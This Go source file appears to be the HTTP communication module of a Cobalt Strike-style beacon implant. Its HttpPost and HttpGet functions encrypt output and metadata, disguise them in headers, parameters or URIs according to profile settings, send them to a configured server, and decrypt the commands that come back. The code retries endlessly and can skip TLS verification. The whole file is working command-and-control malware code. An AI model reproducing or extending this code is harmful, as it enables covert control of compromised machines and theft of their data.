package packet

import (
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"main/config"
	"main/crypt"
	"net/http"
	"net/url"
	"time"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

func init() {
	httpRequest.SetTimeout(config.TimeOut * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)

	if config.ProxyOn {
		url_i := url.URL{}
		url_proxy, _ := url_i.Parse(config.Proxy)
		trans.Proxy = http.ProxyURL(url_proxy)
	}

	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
}

func HttpPost(Url string, data []byte, cryptTypes []string, id []byte) ([]byte, error) {
	var resp *req.Resp
	var err error
	var idHeader req.Header
	data, _ = crypt.EncryptMultipleTypes(data, config.Http_post_client_output_crypt)
	data = append([]byte(config.Http_post_client_output_prepend), data...)
	data = append(data, []byte(config.Http_post_client_output_append)...)
	id = append([]byte(config.Http_post_id_prepend), id...)
	id = append(id, []byte(config.Http_post_id_append)...)
	Url = Url + "?"
	if config.Http_post_id_type == "header" {
		idHeader = req.Header{config.Http_post_id_type_value: string(id)}
	} else if config.Http_post_id_type == "parameter" {
		Url = Url + config.Http_post_id_type_value + "=" + url.QueryEscape(string(id)) + "&"
	} else {
		return nil, errors.New("This type is not supported now for id")
	}
	for {
		if config.Http_post_client_output_type == "header" {
			Data := req.Header{config.Http_post_client_output_type_value: string(data)}
			resp, err = httpRequest.Post(Url, Data, config.HttpHeaders, idHeader)
		} else if config.Http_post_client_output_type == "parameter" {
			resp, err = httpRequest.Post(Url+config.Http_post_client_output_type_value+"="+url.QueryEscape(string(data)), config.HttpHeaders, idHeader)
		} else if config.Http_post_client_output_type == "print" {
			resp, err = httpRequest.Post(Url, data, config.HttpHeaders, idHeader)
		} else {
			return nil, errors.New("This type is not supported now for Post")
		}
		if err != nil {
			//fmt.Printf("!error: %v\n",err)
			fmt.Printf("post connect error!")
			time.Sleep(config.WaitTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				//fmt.Println(resp.String())
				return ParsePostResponse(resp.Bytes(), cryptTypes)
			}
			break
		}
	}

	return nil, nil
}
func HttpGet(Url string, data string, cryptTypes []string) ([]byte, error) {
	//metaData := req.Header{config.Http_get_metadata_header: config.Http_get_metadata_prepend + cookies}
	var resp *req.Resp
	var err error
	for {
		if config.Http_get_metadata_type == "header" {
			metaData := req.Header{config.Http_get_metadata_type_value: config.Http_get_metadata_prepend + data}
			resp, err = httpRequest.Get(Url, config.HttpHeaders, metaData)
		} else if config.Http_get_metadata_type == "parameter" {
			resp, err = httpRequest.Get(Url+"?"+config.Http_get_metadata_type_value+"="+url.QueryEscape(data), config.HttpHeaders)
		} else if config.Http_get_metadata_type == "uri-append" {
			resp, err = httpRequest.Get(Url+url.QueryEscape(config.Http_get_metadata_prepend+data), config.HttpHeaders)
		} else {
			return nil, errors.New("This type is not supported now for metadata")
		}
		if err != nil {
			//fmt.Printf("!error: %v\n", err)
			fmt.Printf("get connect error!")
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				//result, err := ParseGetResponse(resp.Bytes())
				//fmt.Println(resp.Bytes())
				//fmt.Println(string(resp.Bytes()))
				//test, _ :=ParseGetResponse(resp.Bytes(), cryptTypes)
				//fmt.Println(string(test))
				return ParseGetResponse(resp.Bytes(), cryptTypes)
			}
			break
		}
	}
	return nil, nil
}

func ParseGetResponse(data []byte, cryptTypes []string) ([]byte, error) {
	var err error
	data = bytes.TrimPrefix(data, []byte(config.Http_get_output_prepend))
	data = bytes.TrimSuffix(data, []byte(config.Http_get_output_append))
	data, err = crypt.DecryptMultipleTypes(data, cryptTypes)
	return data, err
}

func ParsePostResponse(data []byte, cryptTypes []string) ([]byte, error) {
	var err error
	data = bytes.TrimPrefix(data, []byte(config.Http_post_server_output_prepend))
	data = bytes.TrimSuffix(data, []byte(config.Http_post_server_output_append))
	data, err = crypt.DecryptMultipleTypes(data, cryptTypes)
	return data, err
}
